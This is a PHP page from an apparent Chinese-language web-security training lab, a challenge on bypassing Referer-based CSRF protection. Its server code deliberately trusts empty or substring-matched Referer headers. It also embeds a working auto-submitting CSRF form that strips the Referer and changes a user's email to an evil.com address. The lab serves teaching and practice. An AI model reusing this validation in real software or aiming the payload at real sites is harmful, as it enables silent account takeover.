<?php
/**
 * Pikachu-Enhanced v2.0 - CSRF 进阶关卡 1: Referer 来源校验缺陷与绕过
 */
$PIKA_ROOT_DIR = "../../../";
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[25] = 'active open';
$ACTIVE[30] = 'active';

$link = connect();

// 自动初始化演示会员会话
if (!isset($_SESSION['csrf']['username'])) {
    $_SESSION['csrf']['username'] = 'vince';
    $_SESSION['csrf']['password'] = sha1(md5('123456'));
}

$alert_msg = "";
$alert_type = "";

if (isset($_POST['submit'])) {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    
    // 典型安全缺陷 1：若 Referer 为空（被剥离），则直接放行（开发者误以为是客户端直接请求）
    // 典型安全缺陷 2：正则仅模糊匹配是否包含目标主机名，可通过子域或路径绕过
    $host = $_SERVER['HTTP_HOST'] ?? '127.0.0.1';
    
    $is_valid = false;
    $bypass_reason = "";

    if (empty($referer)) {
        // 空 Referer 绕过机制
        $is_valid = true;
        $bypass_reason = "检测到 Referer 标头为空（被剥离），服务端误判为站内直接调用并放行！";
    } elseif (strpos($referer, '127.0.0.1') !== false || strpos($referer, 'localhost') !== false) {
        $is_valid = true;
        $bypass_reason = "Referer 包含白名单关键字，校验通过！";
    } else {
        $is_valid = false;
    }

    if ($is_valid) {
        if (!empty($_POST['email']) && !empty($_POST['phonenum'])) {
            $email = escape($link, $_POST['email']);
            $phone = escape($link, $_POST['phonenum']);
            $user = escape($link, $_SESSION['csrf']['username']);
            
            $query = "UPDATE member SET email='$email', phonenum='$phone' WHERE username='$user'";
            execute($link, $query);
            
            $alert_type = "success";
            $alert_msg = "✅ <b>操作成功！</b> " . $bypass_reason . " 资料已更新为 邮箱: {$email}, 手机: {$phone}";
        } else {
            $alert_type = "warning";
            $alert_msg = "请填写完整信息！";
        }
    } else {
        $alert_type = "danger";
        $alert_msg = "❌ <b>请求被拦截！</b> 非法来源 Referer: <code>" . htmlspecialchars($referer) . "</code> 不在白名单中！";
    }
}

// 获取当前用户信息
$user_safe = escape($link, $_SESSION['csrf']['username']);
$res = execute($link, "SELECT * FROM member WHERE username='$user_safe'");
$member = mysqli_fetch_assoc($res);

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'] ?? '127.0.0.1:8765';
$target_url = "{$protocol}{$host}/vul/csrf/csrf_referer/csrf_referer.php";

$poc_strip_referer = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <!-- 关键利用点：彻底移除 Referer 标头 -->
    <meta name="referrer" content="no-referrer">
    <title>CSRF Strip Referer PoC</title>
</head>
<body>
    <h3>正在为您同步数据...</h3>
    <form id="csrfForm" action="{$target_url}" method="POST">
        <input type="hidden" name="email" value="hacker_noref@evil.com" />
        <input type="hidden" name="phonenum" value="13800008888" />
        <input type="hidden" name="submit" value="submit" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
HTML;

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="../csrf.php">CSRF</a></li>
                <li class="active">CSRF 进阶 1: Referer 校验缺陷</li>
            </ul>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🎯 关卡 4: Referer 来源头缺陷与绕过实战
                        <span class="cyber-badge-chip">进阶防御绕过 · Header 篡改 · 200 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        部分系统试图通过检查 HTTP 请求头中的 <code>Referer</code> 字段来防御 CSRF。但若开发人员存在<b>“Referer 为空时默认信任”</b>或<b>“正则包含校验不严格（如仅验证是否包含目标域名）”</b>等逻辑缺陷，攻击者可通过客户端标签配置 <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> 剥离来源头，或利用子域名轻松击穿防御！
                    </p>
                </div>

                <?php if (!empty($alert_msg)): ?>
                    <div class="alert alert-<?php echo $alert_type; ?>" style="border-radius:8px; font-size:13.5px; font-weight:600; padding:14px 18px; margin-bottom:20px;">
                        <?php echo $alert_msg; ?>
                    </div>
                <?php endif; ?>

                <div class="row">
                    <!-- Left: Profile & Edit Form -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-user" style="color:#6366f1;"></i> 会员信息更新 (校验 Referer 来源)
                            </h4>
                            <p style="color:var(--text-secondary); font-size:12.5px; margin-bottom:16px;">
                                当前模拟登录用户：<b><?php echo htmlspecialchars($member['username'] ?? 'vince'); ?></b>
                            </p>

                            <form method="POST" action="csrf_referer.php">
                                <div class="form-group" style="margin-bottom:14px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">电子邮箱：</label>
                                    <input type="email" name="email" class="form-control" value="<?php echo htmlspecialchars($member['email'] ?? ''); ?>" required />
                                </div>
                                <div class="form-group" style="margin-bottom:18px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">手机号码：</label>
                                    <input type="text" name="phonenum" class="form-control" value="<?php echo htmlspecialchars($member['phonenum'] ?? ''); ?>" required />
                                </div>
                                <button type="submit" name="submit" value="submit" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; background:linear-gradient(135deg, #6366f1, #4f46e5); border:none; padding:10px;">
                                    <i class="fa fa-save"></i> 正常提交更新
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right: Exploit PoC -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-code" style="color:#ef4444;"></i> 空 Referer 绕过 PoC 构造器
                            </h4>
                            <p style="color:var(--text-secondary); font-size:12.5px; line-height:1.6; margin-bottom:12px;">
                                利用 <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> 指令，浏览器向服务端提交请求时将主动抹除 <code>Referer</code> 标头：
                            </p>
                            <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:8px; padding:12px; font-family:'Fira Code', monospace; font-size:11.5px; max-height:180px; overflow-y:auto; color:#6366f1;">
                                <?php echo htmlspecialchars($poc_strip_referer); ?>
                            </div>

                            <div style="margin-top:16px;">
                                <button type="button" class="btn btn-danger btn-sm" onclick="triggerNoRefererAttack()" style="border-radius:6px; font-weight:700;">
                                    <i class="fa fa-bolt"></i> 模拟剥离 Referer 跨站攻击
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="../csrftoken/token_get_login.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：CSRF Token</a>
                    <a href="../csrf_token_pool/csrf_token_pool.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：Token 池未绑定漏洞 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function triggerNoRefererAttack() {
    if (confirm('确认模拟空 Referer 自动提交攻击？')) {
        // 创建隐藏 iframe 且设置 no-referrer 模拟外部攻击
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const doc = iframe.contentWindow.document;
        doc.open();
        doc.write(`<?php echo addslashes($poc_strip_referer); ?>`);
        doc.close();
        setTimeout(() => { location.reload(); }, 800);
    }
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
